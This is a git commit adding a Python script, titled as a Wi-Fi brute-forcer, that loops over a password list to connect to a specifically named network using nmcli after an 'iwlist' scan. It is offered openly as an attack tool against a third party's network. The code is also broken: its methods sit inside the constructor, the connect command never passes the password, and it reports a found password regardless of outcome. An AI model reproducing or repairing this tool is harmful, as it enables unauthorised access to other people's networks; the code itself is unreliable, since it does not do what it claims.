496d85ac25eb9981a6238d2124db8e1b4ce2d70c
rxfxxh <160151456+rxfxxh@users.noreply.github.com>
2024-03-24 21:29:02 -0300

    Add files via upload

---
+++ WiFi-BruteForce-by-rxfxxh.py
@@ -0,0 +1,45 @@
+import os
+import subprocess
+
+class Finder:
+    def __init__(self, *args, **kwargs):
+        self.server_name = kwargs['server_name']
+        self.password = kwargs['password']
+        self.interface_name = kwargs['interface']
+        self.main_dict = {}
+
+        def run(self):
+            name = self.server_name
+            try:
+                resultado = self.connection(name)
+            except Exception as exp:
+                print('[-] Senha inválida!')
+            else:
+                if resultado:
+                    print('[+] Sucesso, conectado a {}'.format(name))
+                print('----------')
+                print(f'[+]Senha encontrada!: {self.password}')
+                exit(0)
+        
+        def connection(self, name):
+            try:
+                output = subprocess.check_output('nmcli d wifi connect' + self.server_name)
+
+            except:
+                raise
+
+            else:
+                return True
+            
+if __name__ == '__main__':
+    server_name = 'LYKENET-BATISTA'
+    f = open('pwords.txt', 'r')
+    txt = f.read()
+    passwords = txt.splitlines()
+    output = subprocess.check_output('sudo iwlist wlan0 scan', shell=True)
+    print(output)
+    interface_name = 'wlan0'
+    for password in passwords:
+        F = Finder(server_name=server_name, password=password, interface=interface_name)
+        F.run()
+        
